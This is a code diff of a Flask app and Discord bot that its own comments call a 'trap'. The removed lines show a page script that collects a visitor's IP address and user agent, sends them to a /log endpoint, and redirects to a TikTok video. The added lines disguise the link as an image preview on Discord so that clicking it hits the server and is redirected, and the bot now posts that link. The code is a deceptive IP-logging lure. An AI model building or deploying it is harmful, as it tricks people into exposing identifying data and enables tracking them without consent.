@@ -5,7 +5,7 @@ import requests
 import threading
 import discord
 from discord.ext import commands
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, send_file
 
 # Force IPv4 to prevent Railway boot hangs
 _orig_getaddrinfo = socket.getaddrinfo
@@ -23,39 +23,32 @@ RAILWAY_URL = "https://rnbw-production.up.railway.app"
 
 @app.route('/')
 def index():
-    return render_template_string("""
+    # This page is what Discord scrapes. It looks like an image page.
+    # The og:image points to your image.png
+    return """
     <!DOCTYPE html>
     <html>
     <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Redirecting...</title>
-        <style>
-            body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-            .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        </style>
-    </head>
-    <body>
-        <div class="loader"></div>
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="Click to view">
+        <meta property="og:image" content="https://rnbw-production.up.railway.app/image.png">
         <script>
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => {
-                    fetch('/log', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
-                    }).then(() => {
-                        window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
-                    });
-                })
-                .catch(() => {
-                    window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
-                });
+            // The moment they click the embed, this script runs
+            window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
         </script>
-    </body>
+    </head>
+    <body></body>
     </html>
-    """)
+    """
+
+@app.route('/image.png')
+def serve_image():
+    # We serve the image from the Railway server, not from GitHub
+    # You must upload your image to GitHub and name it image.png
+    try:
+        return send_file("image.png", mimetype='image/png')
+    except:
+        return "Image not found", 404
 
 @app.route('/log', methods=['POST'])
 def log():
@@ -94,23 +87,9 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # We create an embed. 
-    # The thumbnail is your uploaded image.
-    # The URL of the embed is your trap.
-    embed = discord.Embed(
-        title="",
-        url=RAILWAY_URL,
-        color=0x2b2d31
-    )
-    # This attaches the image to the embed
-    # IMPORTANT: You must upload your image to GitHub and name it 'image.png'
-    # But instead of uploading it as a file, we send it as an attachment URL.
-    
-    file = discord.File("image.png", filename="image.png")
-    embed.set_image(url="attachment://image.png")
-
-    # We send the embed. The entire image becomes clickable because of the embed.url
-    await ctx.send(embed=embed, file=file)
+    # We send the raw URL. Discord will scrape the og:image, show the picture.
+    # When they click the picture, they hit the / route, which redirects them.
+    await ctx.send(f"<{RAILWAY_URL}>")
 
 def run_bot():
     if not BOT_TOKEN:
